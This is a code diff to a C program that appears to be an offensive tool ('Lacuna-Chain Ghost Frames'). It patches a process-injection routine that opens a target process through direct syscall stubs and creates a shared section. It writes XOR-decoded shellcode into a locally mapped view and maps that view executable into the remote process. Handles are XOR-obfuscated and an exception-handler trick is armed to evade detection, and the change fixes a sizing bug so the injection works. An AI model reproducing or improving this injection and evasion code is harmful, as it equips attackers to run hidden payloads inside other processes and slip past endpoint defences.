@@ -895,9 +895,14 @@ static bool do_inject_sapc(DWORD pid, uint8_t *sc, SIZE_T sc_sz)
     static PNtProtectVirtualMemory prot_vm;
     static HANDLE hProc, hSec;
     static PVOID  local_base, remote_base;
-    static SIZE_T local_sz, remote_sz;
+    static SIZE_T *p_local_sz = NULL, *p_remote_sz = NULL;
     static PVOID  pcrypt_veh, veh;
     static NTSTATUS s;
+
+    if (!p_local_sz) {
+        p_local_sz  = (SIZE_T *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SIZE_T));
+        p_remote_sz = (SIZE_T *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SIZE_T));
+    }
 
     open_proc  = alloc_stub(ssns[0], srs[0]);
     mk_sec     = alloc_stub(ssns[1], srs[1]);
@@ -933,8 +938,8 @@ static bool do_inject_sapc(DWORD pid, uint8_t *sc, SIZE_T sc_sz)
 #define EP(p) ((void*)((ULONG64)(p) ^ PKEY))
 
     hProc = NULL; hSec = NULL;
-    local_base = NULL; local_sz = 0;
-    remote_base = NULL; remote_sz = 0;
+    local_base = NULL; *p_local_sz = 0;
+    remote_base = NULL; *p_remote_sz = 0;
     OBJECT_ATTRIBUTES oa  = { sizeof(OBJECT_ATTRIBUTES) };
     CID cid = { (HANDLE)(ULONG_PTR)pid, NULL };
 
@@ -970,9 +975,9 @@ static bool do_inject_sapc(DWORD pid, uint8_t *sc, SIZE_T sc_sz)
     if (!NT_OK(s)) { fprintf(stderr, "[-] NtCreateSection: %08lx\n", s); goto done; }
     printf("[+] section  %p\n", hSec); fflush(stdout);
 
-    local_base = NULL; local_sz = 0;
-    pcrypt_arm(0, srs[2], false);
-    s = map_view(hSec, (HANDLE)-1, &local_base, 0, sc_sz, NULL, &local_sz,
+    local_base = NULL; *p_local_sz = sc_sz;
+    pcrypt_arm(0, srs[2], true);
+    s = map_view(hSec, (HANDLE)-1, &local_base, 0, sc_sz, NULL, p_local_sz,
                  ViewUnmap, 0, PAGE_READWRITE);
     if (!NT_OK(s)) { fprintf(stderr, "[-] NtMapViewOfSection(local): %08lx\n", s); goto done; }
     printf("[+] local rw  %p\n", local_base); fflush(stdout);
@@ -981,14 +986,14 @@ static bool do_inject_sapc(DWORD pid, uint8_t *sc, SIZE_T sc_sz)
     for (SIZE_T i = 0; i < sc_sz; i++) ((uint8_t *)local_base)[i] ^= 0x5A;
     printf("[+] shellcode written (%zu bytes)\n", sc_sz); fflush(stdout);
 
-    remote_base = NULL; remote_sz = 0;
-    pcrypt_arm(PKEY, srs[2], false);
+    remote_base = NULL; *p_remote_sz = sc_sz;
+    pcrypt_arm(PKEY, srs[2], true);
     s = map_view(
         (HANDLE)((ULONG64)hSec ^ PKEY),
         (HANDLE)((ULONG64)hProc ^ PKEY),
         (PVOID *)EP(&remote_base),
         (ULONG_PTR)(0 ^ PKEY),
-        sc_sz, NULL, &remote_sz,
+        sc_sz, NULL, p_remote_sz,
         ViewUnmap, 0, PAGE_EXECUTE_READ);
     if (!NT_OK(s)) { fprintf(stderr, "[-] NtMapViewOfSection(remote): %08lx\n", s); goto done; }
     printf("[+] remote rx  %p\n", remote_base); fflush(stdout);
@@ -1101,7 +1106,7 @@ static void do_scan(void)
 int main(int argc, char **argv)
 {
     SetConsoleOutputCP(CP_UTF8);
-    printf("LACUNA Chain — Ghost Frames: Forging Plausible Call Stacks from .pdata Lacunae\n");
+    printf("Lacuna-Chain Ghost Frames: Forging Plausible Call Stacks from .pdata Lacunae\n");
     printf("Mohamed Alzhrani (0xmaz), 2026\n\n");
 
     if (argc < 2) {
